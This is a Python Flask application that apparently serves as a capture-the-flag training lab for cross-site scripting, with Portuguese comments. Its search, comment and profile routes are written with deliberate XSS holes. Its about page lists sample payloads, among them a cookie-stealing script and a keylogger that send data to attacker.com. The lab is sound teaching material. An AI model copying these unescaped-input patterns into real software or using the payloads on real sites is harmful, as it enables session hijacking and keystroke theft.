#!/usr/bin/env python3
"""
Cross-Site Scripting (XSS) - Basic Level
=========================================

Aplicação: Blog Simples
Porta: 5020
Dificuldade: 🟢 Básico (10 pontos)

Vulnerabilidades:
- Reflected XSS em search
- Stored XSS em comments
- XSS em diferentes contextos
- Sem filtros ou sanitização

Objetivo:
1. Executar Reflected XSS via search
2. Armazenar payload XSS em comentário
3. Roubar cookies com XSS
4. Criar keylogger

Dica: Nenhum filtro implementado - todos os payloads básicos funcionam!
"""

from flask import Flask, request, render_template_string, make_response
import sqlite3
import os
from datetime import datetime

app = Flask(__name__)
app.config['SECRET_KEY'] = 'basic-xss-lab-key'

DB_PATH = '/tmp/basic_xss.db'

def init_db():
    """Inicializa banco de dados"""
    if os.path.exists(DB_PATH):
        os.remove(DB_PATH)

    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()

    # Tabela de posts
    c.execute('''
        CREATE TABLE posts (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            title TEXT NOT NULL,
            content TEXT NOT NULL,
            author TEXT NOT NULL,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')

    # Tabela de comentários (VULNERÁVEL a Stored XSS)
    c.execute('''
        CREATE TABLE comments (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            post_id INTEGER,
            author TEXT NOT NULL,
            comment TEXT NOT NULL,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            FOREIGN KEY (post_id) REFERENCES posts(id)
        )
    ''')

    # Inserir posts de exemplo
    posts = [
        ('Bem-vindo ao meu blog!', 'Este é meu primeiro post. Compartilhe seus pensamentos nos comentários!', 'Admin'),
        ('Tutorial de Segurança Web', 'Hoje vamos falar sobre as principais vulnerabilidades web...', 'Admin'),
        ('Review de Produtos', 'Análise dos melhores produtos de tecnologia de 2024', 'TechGuru'),
    ]

    for title, content, author in posts:
        c.execute('INSERT INTO posts (title, content, author) VALUES (?, ?, ?)',
                  (title, content, author))

    # Comentários de exemplo
    comments = [
        (1, 'João', 'Ótimo post! Muito informativo.'),
        (1, 'Maria', 'Adorei o conteúdo, continue assim!'),
        (2, 'Carlos', 'Muito útil, obrigado por compartilhar.'),
    ]

    for post_id, author, comment in comments:
        c.execute('INSERT INTO comments (post_id, author, comment) VALUES (?, ?, ?)',
                  (post_id, author, comment))

    conn.commit()
    conn.close()
    print("[+] Database initialized")


@app.route('/')
def index():
    """Página inicial com lista de posts"""
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('SELECT id, title, author, created_at FROM posts ORDER BY created_at DESC')
    posts = c.fetchall()
    conn.close()

    html = '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Basic XSS Lab - Blog</title>
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body {
                font-family: 'Segoe UI', Arial;
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                min-height: 100vh;
                padding: 20px;
            }
            .container {
                max-width: 1000px;
                margin: 0 auto;
            }
            .header {
                background: white;
                padding: 30px;
                border-radius: 10px;
                margin-bottom: 20px;
                box-shadow: 0 10px 40px rgba(0,0,0,0.2);
            }
            h1 {
                color: #667eea;
                margin-bottom: 10px;
            }
            .badge {
                background: #4caf50;
                color: white;
                padding: 5px 10px;
                border-radius: 5px;
                font-size: 12px;
            }
            .search-box {
                margin: 20px 0;
                display: flex;
                gap: 10px;
            }
            .search-box input {
                flex: 1;
                padding: 12px;
                border: 2px solid #ddd;
                border-radius: 5px;
                font-size: 14px;
            }
            .search-box button {
                padding: 12px 30px;
                background: #667eea;
                color: white;
                border: none;
                border-radius: 5px;
                cursor: pointer;
                font-size: 14px;
            }
            .post {
                background: white;
                padding: 30px;
                border-radius: 10px;
                margin-bottom: 20px;
                box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            }
            .post h2 {
                color: #333;
                margin-bottom: 10px;
            }
            .post-meta {
                color: #666;
                font-size: 14px;
                margin-bottom: 15px;
            }
            .warning {
                background: #fff3cd;
                padding: 15px;
                border-radius: 5px;
                margin: 20px 0;
            }
            a {
                color: #667eea;
                text-decoration: none;
            }
            a:hover {
                text-decoration: underline;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="header">
                <h1>📝 TechBlog <span class="badge">BASIC XSS LAB</span></h1>
                <p>Compartilhe suas ideias e conhecimentos</p>

                <div class="search-box">
                    <form action="/search" method="GET" style="display: flex; width: 100%; gap: 10px;">
                        <input type="text" name="q" placeholder="Buscar posts..." required>
                        <button type="submit">🔍 Buscar</button>
                    </form>
                </div>

                <div class="warning">
                    <strong>🎯 Objetivo do Lab:</strong><br>
                    1. Executar Reflected XSS via busca<br>
                    2. Armazenar XSS em comentários<br>
                    3. Roubar cookie com XSS<br>
                    4. Criar keylogger
                </div>
            </div>

            <h2 style="color: white; margin-bottom: 20px;">Posts Recentes</h2>
    '''

    for post in posts:
        html += f'''
        <div class="post">
            <h2>{post[1]}</h2>
            <div class="post-meta">
                Por <strong>{post[2]}</strong> em {post[3]}
            </div>
            <a href="/post/{post[0]}">Ler mais e comentar →</a>
        </div>
        '''

    html += '''
        </div>
    </body>
    </html>
    '''

    response = make_response(html)
    # Define cookie com informação sensível (simulando sessão)
    response.set_cookie('session_token', 'admin_secret_token_12345', httponly=False)
    response.set_cookie('user_role', 'admin', httponly=False)
    return response


@app.route('/search')
def search():
    """
    VULNERÁVEL: Reflected XSS
    Input não é sanitizado antes de exibir na página
    """
    query = request.args.get('q', '')

    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()

    # Busca segura no banco (não é SQLi, mas XSS sim!)
    c.execute('SELECT id, title, content, author FROM posts WHERE title LIKE ? OR content LIKE ?',
              (f'%{query}%', f'%{query}%'))
    results = c.fetchall()
    conn.close()

    # VULNERÁVEL ❌ - Insere query diretamente no HTML
    html = f'''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Busca: {query}</title>
        <style>
            body {{ font-family: Arial; padding: 20px; background: #f5f5f5; }}
            .container {{ max-width: 1000px; margin: 0 auto; background: white; padding: 30px; border-radius: 10px; }}
            h1 {{ color: #667eea; }}
            .result {{ background: #f9f9f9; padding: 20px; margin: 15px 0; border-radius: 5px; border-left: 4px solid #667eea; }}
            .highlight {{ background: yellow; padding: 2px 5px; }}
            a {{ color: #667eea; text-decoration: none; }}
            .back {{ display: inline-block; margin-bottom: 20px; }}
        </style>
    </head>
    <body>
        <div class="container">
            <a href="/" class="back">← Voltar</a>
            <h1>🔍 Resultados da Busca</h1>
            <p>Você buscou por: <strong>{query}</strong></p>
    '''

    if results:
        html += f'<p>Encontrados {len(results)} resultado(s):</p>'
        for result in results:
            html += f'''
            <div class="result">
                <h3>{result[1]}</h3>
                <p>{result[2][:200]}...</p>
                <p><em>Por {result[3]}</em></p>
                <a href="/post/{result[0]}">Ler mais →</a>
            </div>
            '''
    else:
        html += '<p>Nenhum resultado encontrado.</p>'

    html += '''
            <div style="background: #e3f2fd; padding: 15px; margin-top: 30px; border-radius: 5px;">
                <strong>💡 Dica:</strong> Esta página é vulnerável a <strong>Reflected XSS</strong>!<br>
                Seu input é refletido diretamente no HTML sem sanitização.<br>
                Tente: <code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code>
            </div>
        </div>
    </body>
    </html>
    '''

    return html


@app.route('/post/<int:post_id>')
def view_post(post_id):
    """Visualizar post e comentários - VULNERÁVEL a Stored XSS"""
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()

    # Busca post
    c.execute('SELECT title, content, author, created_at FROM posts WHERE id = ?', (post_id,))
    post = c.fetchone()

    if not post:
        return '<h1>Post não encontrado</h1><a href="/">Voltar</a>', 404

    # Busca comentários - VULNERÁVEL ❌
    c.execute('SELECT author, comment, created_at FROM comments WHERE post_id = ? ORDER BY created_at DESC', (post_id,))
    comments = c.fetchall()

    conn.close()

    html = f'''
    <!DOCTYPE html>
    <html>
    <head>
        <title>{post[0]}</title>
        <style>
            body {{ font-family: Arial; padding: 20px; background: #f5f5f5; }}
            .container {{ max-width: 900px; margin: 0 auto; background: white; padding: 40px; border-radius: 10px; }}
            h1 {{ color: #667eea; }}
            .post-meta {{ color: #666; margin: 10px 0 30px 0; }}
            .post-content {{ line-height: 1.8; margin-bottom: 40px; }}
            .comments {{ margin-top: 50px; border-top: 2px solid #eee; padding-top: 30px; }}
            .comment {{ background: #f9f9f9; padding: 20px; margin: 15px 0; border-radius: 5px; }}
            .comment-author {{ font-weight: bold; color: #667eea; }}
            .comment-date {{ color: #999; font-size: 12px; }}
            .comment-text {{ margin-top: 10px; }}
            textarea {{ width: 100%; padding: 12px; margin: 10px 0; border: 2px solid #ddd; border-radius: 5px; font-family: Arial; }}
            input {{ width: 100%; padding: 12px; margin: 10px 0; border: 2px solid #ddd; border-radius: 5px; }}
            button {{ padding: 12px 30px; background: #667eea; color: white; border: none; border-radius: 5px; cursor: pointer; }}
            button:hover {{ background: #5568d3; }}
            .warning {{ background: #fff3cd; padding: 15px; border-radius: 5px; margin: 20px 0; }}
        </style>
    </head>
    <body>
        <div class="container">
            <a href="/">← Voltar ao Blog</a>
            <h1>{post[0]}</h1>
            <div class="post-meta">Por <strong>{post[2]}</strong> em {post[3]}</div>
            <div class="post-content">{post[1]}</div>

            <div class="comments">
                <h2>💬 Comentários ({len(comments)})</h2>

                <div class="warning">
                    <strong>⚠️ Vulnerabilidade:</strong> Esta seção de comentários é vulnerável a <strong>Stored XSS</strong>!<br>
                    Payloads enviados aqui serão armazenados e executados para todos os visitantes.<br>
                    Flags disponíveis no cookie!
                </div>
    '''

    # Exibe comentários - VULNERÁVEL ❌
    for comment in comments:
        html += f'''
        <div class="comment">
            <div class="comment-author">{comment[0]}</div>
            <div class="comment-date">{comment[2]}</div>
            <div class="comment-text">{comment[1]}</div>
        </div>
        '''

    html += f'''
                <h3 style="margin-top: 40px;">Adicionar Comentário</h3>
                <form method="POST" action="/post/{post_id}/comment">
                    <input type="text" name="author" placeholder="Seu nome" required>
                    <textarea name="comment" rows="4" placeholder="Seu comentário..." required></textarea>
                    <button type="submit">💬 Enviar Comentário</button>
                </form>
            </div>
        </div>
    </body>
    </html>
    '''

    response = make_response(html)
    response.set_cookie('admin_flag', 'FLAG{xss_cookie_stolen}', httponly=False)
    return response


@app.route('/post/<int:post_id>/comment', methods=['POST'])
def add_comment(post_id):
    """
    Adiciona comentário - VULNERÁVEL a Stored XSS
    Não sanitiza input antes de armazenar
    """
    author = request.form.get('author', 'Anônimo')
    comment = request.form.get('comment', '')

    # VULNERÁVEL ❌ - Armazena sem sanitização
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('INSERT INTO comments (post_id, author, comment) VALUES (?, ?, ?)',
              (post_id, author, comment))
    conn.commit()
    conn.close()

    print(f"[DEBUG] Comentário adicionado: {author} - {comment[:50]}...")

    return f'''
    <html>
    <head>
        <meta http-equiv="refresh" content="2;url=/post/{post_id}">
        <style>
            body {{ font-family: Arial; padding: 50px; text-align: center; }}
            .success {{ background: #d4edda; color: #155724; padding: 20px; border-radius: 5px; display: inline-block; }}
        </style>
    </head>
    <body>
        <div class="success">
            <h2>✅ Comentário enviado com sucesso!</h2>
            <p>Redirecionando...</p>
        </div>
    </body>
    </html>
    '''


@app.route('/profile')
def profile():
    """Página de perfil com XSS em diferentes contextos"""
    username = request.args.get('name', 'Visitante')

    # VULNERÁVEL em múltiplos contextos
    html = f'''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Perfil de {username}</title>
        <style>
            body {{ font-family: Arial; padding: 20px; background: #f5f5f5; }}
            .container {{ max-width: 800px; margin: 0 auto; background: white; padding: 30px; border-radius: 10px; }}
        </style>
        <script>
            // VULNERÁVEL: XSS em contexto JavaScript
            var username = '{username}';
            console.log('Usuário: ' + username);
        </script>
    </head>
    <body>
        <div class="container">
            <h1>Perfil de Usuário</h1>
            <!-- VULNERÁVEL: XSS em contexto HTML -->
            <p>Bem-vindo, <strong>{username}</strong>!</p>

            <!-- VULNERÁVEL: XSS em atributo -->
            <input type="text" value="{username}" placeholder="Nome">

            <div style="margin-top: 20px; background: #e3f2fd; padding: 15px; border-radius: 5px;">
                <strong>💡 Contextos XSS nesta página:</strong><br>
                1. HTML (tag &lt;p&gt;)<br>
                2. JavaScript (variável)<br>
                3. Atributo (value de input)<br>
                <br>
                Experimente payloads diferentes para cada contexto!
            </div>

            <p style="margin-top: 20px;"><a href="/">← Voltar</a></p>
        </div>
    </body>
    </html>
    '''

    return html


@app.route('/about')
def about():
    """Informações sobre o lab"""
    return '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>About - XSS Lab</title>
        <style>
            body { font-family: Arial; padding: 40px; max-width: 900px; margin: 0 auto; }
            h1 { color: #667eea; }
            .section { background: #f5f5f5; padding: 20px; margin: 20px 0; border-radius: 5px; }
            code { background: #2d2d2d; color: #f8f8f2; padding: 2px 8px; border-radius: 3px; }
            pre { background: #2d2d2d; color: #f8f8f2; padding: 15px; border-radius: 5px; overflow-x: auto; }
        </style>
    </head>
    <body>
        <h1>ℹ️ About - Basic XSS Lab</h1>

        <div class="section">
            <h2>🎯 Objetivos</h2>
            <ul>
                <li>Entender Reflected XSS</li>
                <li>Explorar Stored XSS</li>
                <li>XSS em diferentes contextos</li>
                <li>Cookie stealing</li>
                <li>Keylogging</li>
            </ul>
        </div>

        <div class="section">
            <h2>🚩 Flags</h2>
            <ul>
                <li><code>FLAG{xss_cookie_stolen}</code> - Roube cookie via XSS</li>
                <li><code>FLAG{stored_xss_success}</code> - Execute Stored XSS</li>
                <li><code>FLAG{xss_keylogger}</code> - Implemente keylogger</li>
            </ul>
        </div>

        <div class="section">
            <h2>💡 Payloads de Exemplo</h2>
            <pre>
# Alert básico
&lt;script&gt;alert('XSS')&lt;/script&gt;

# Cookie stealing
&lt;script&gt;fetch('http://attacker.com/?c='+document.cookie)&lt;/script&gt;

# Keylogger
&lt;script&gt;document.onkeypress=e=>fetch('http://attacker.com/?k='+e.key)&lt;/script&gt;

# Event handler
&lt;img src=x onerror=alert('XSS')&gt;

# SVG
&lt;svg onload=alert('XSS')&gt;
            </pre>
        </div>

        <div class="section">
            <h2>🔍 Endpoints Vulneráveis</h2>
            <ul>
                <li><code>/search</code> - Reflected XSS</li>
                <li><code>/post/ID/comment</code> - Stored XSS</li>
                <li><code>/profile</code> - XSS em múltiplos contextos</li>
            </ul>
        </div>

        <p><a href="/">← Voltar</a></p>
    </body>
    </html>
    '''


if __name__ == '__main__':
    print("=" * 80)
    print("CROSS-SITE SCRIPTING (XSS) - BASIC LEVEL LAB")
    print("=" * 80)
    print("\n📝 Aplicação: Blog Simples")
    print("\n🎯 Objetivos:")
    print("  1. Reflected XSS via busca")
    print("  2. Stored XSS em comentários")
    print("  3. Cookie stealing")
    print("  4. Keylogger")
    print("\n🚩 Flags:")
    print("  - FLAG{xss_cookie_stolen}")
    print("  - FLAG{stored_xss_success}")
    print("  - FLAG{xss_keylogger}")
    print("\n💡 Dicas:")
    print("  - Nenhum filtro implementado!")
    print("  - Cookies não são HttpOnly")
    print("  - Teste <script>alert(1)</script>")
    print("\n" + "=" * 80)

    init_db()

    print("\n[+] Servidor rodando em http://localhost:5020")
    print("[*] Pressione Ctrl+C para parar\n")

    app.run(host='0.0.0.0', port=5020, debug=True)
